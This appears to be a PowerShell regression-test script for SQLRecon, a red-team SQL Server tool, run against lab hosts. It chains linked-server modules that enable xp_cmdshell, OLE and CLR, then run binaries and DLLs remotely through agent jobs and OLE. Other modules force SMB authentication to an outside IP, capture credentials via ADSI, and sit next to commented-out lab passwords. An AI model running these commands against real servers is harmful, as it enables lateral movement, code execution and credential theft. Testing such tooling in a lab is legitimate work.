<#
    Execution instructions:
    powershell.exe -nop -exec bypass .\SQLRecon-Linked-Chain-Modules-Test.ps1
#>

<#
    The $global:* variables do not need to be changed.
    The only exception is $global:modules, which can be
    changed to match the number of test cases you execute.
#>
$global:timeout = 1
$global:count = 1
$global:modules = 30
$global:timestamp = Get-Date -Format "MM-dd-yyyy-HH-mm"

<#
    The $authentication variable acts as a quick way to
    switch the authentication type for the following commands.
#>
$authentication = "WinToken"
#$authentication = "WinDomain /domain:kawalabs /username:jsmith /password:Password123"
#$authentication = "WinDomain /domain:kawalabs /username:admin /password:Password123"
#$authentication = "Local /username:sa /password:Password123"
#$authentication = "EntraID /domain:x.onmicrosoft.com /username:jsmith /password:Password123"
#$authentication = "AzureLocal /username:sa /password:Password123"

<#
    The following variables can be changed.
    - $sqlreconPath is the path to where SQLRecon is on disk.
    - $server1 is the hostname or IP of a SQL server.
    - $server2 is the hostname or IP of a SQL server, I use this for linked SQL servers.
    - $server3 is the hostname or IP of a SQL server, you might not need this.
    - $server4 is the hostname or IP of a SQL server, you might not need this.
    - $outputPath is where you want to output the results of this script on disk in markdown.
      keep in mind that the path can not have special characters like ':'. '-' is fine.
#>
$sqlreconPath = ".\SQLRecon.exe"
$server1 = "SQL01"
$server2 = "SQL02"
$server3 = "SQL03"
$server4 = "MECM01"
$authenticationFormatted = $authentication.replace(' ','-').replace('/','').replace('.','-').replace(':','-')
$outputPath = $PSScriptRoot + "\sqlrecon-linked-chain-$authenticationFormatted-$global:timestamp.md"

<#
    .Description
    The Execute function executes a supplied SQLRecon command.
#>
Function Execute($command)
{
    Write-Output "($global:count/$global:modules)"
    Write-Output $command
    Write-Output ""
    Write-Output "Expected Output:"
    Write-Output '```'
    Invoke-Expression $command
    Write-Output '```'
    Write-Output ""
    Invoke-Expression "timeout /t $global:timeout" | Out-Null
    $global:count++
}

# Configuring output to file.
$ErrorActionPreference="SilentlyContinue"
Stop-Transcript | out-null
$ErrorActionPreference = "Continue"
Start-Transcript -path $outputPath

Write-Output "---------------------------------------------------------------------"
Write-Output "[+] SQLRecon - Linked Chain Modules Test Cases"
Write-Output "[+] Variables Set:"
Write-Output "  |-> SQLRecon Path: $sqlreconPath"
Write-Output "  |-> Ouput Path: $outputPath"
Write-Output "  |-> Authentication: $authentication"
Write-Output "  |-> SQL Server 1: $server1"
Write-Output "  |-> SQL Server 2: $server2"
Write-Output "  |-> SQL Server 3: $server3"
Write-Output "  |-> SQL Server 4: $server4"
Write-Output "  |-> Execution Comand: $executionCommand"
Write-Output "[+] Starting test cases against $modules modules at $global:timestamp"
Write-Output "---------------------------------------------------------------------"
Write-Output ""

# Add test cases in this area. In this case there are 30, which is why $global:modules is set to 30.
Write-Output ""
Write-Output "[+] Executing commands - expected to fail to validate error handling"
Write-Output ""
Execute "$sqlreconPath /auth:$authentication /host:$server1,$server2 /link:$server1,$server2,$server3 /chain /m:links"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /link:$server2,$server3 /i:sa /chain /m:links"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /link:$server2,$server3,$server4 /chain /m:enablerpc"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /link:$server2,$server3,$server4 /chain /m:disablerpc"
Write-Output ""
Write-Output "[+] Executing unprivileged commands"
Write-Output ""
# Add test cases in this area. In this case there are 28, which is why $global:modules is set to 28.
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3,$server4 /chain /m:info"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3,$server4 /chain /m:whoami"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3,$server4 /chain /m:users"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3,$server4 /chain /m:databases"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:impersonate"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:links"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:tables /db:master"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:query /c:'select @@servername'"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:checkrpc"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3,$server4 /chain /m:smb /unc:\\172.16.10.21\test"
Write-Output ""
Write-Output "[+] Executing Privileged Commands"
Write-Output ""
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:columns /db:master /table:spt_values"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:rows /db:master /table:spt_values"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:search /db:master /keyword:a"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3,$server4 /chain /m:disableclr"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3,$server4 /chain /m:disableole"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3,$server4 /chain /m:disablexp"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3,$server4 /chain /m:enableclr"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3,$server4 /chain /m:enableole"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3,$server4 /chain /m:enablexp"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:adsi /adsi:linkadsi /lport:30000"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:agentstatus"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:agentcmd /subsystem:cmdexec /command:'c:\temp\mb-l1.exe'"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:agentcmd /c:'c:\temp\mb-l2.exe'"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:clr /dll:'c:\temp\sql.dll' /function:Chicken"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:olecmd /c:'c:\temp\mb-l3.exe'"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:xpcmd /c:'notepad'"
Write-Output "---------------------------------------------------------------------"
Write-Output "[+] SQLRecon - Linked Chain Modules Test Cases"
Write-Output "[+] Completed test cases against $modules modules at $global:timestamp"
Write-Output "---------------------------------------------------------------------"
Stop-Transcript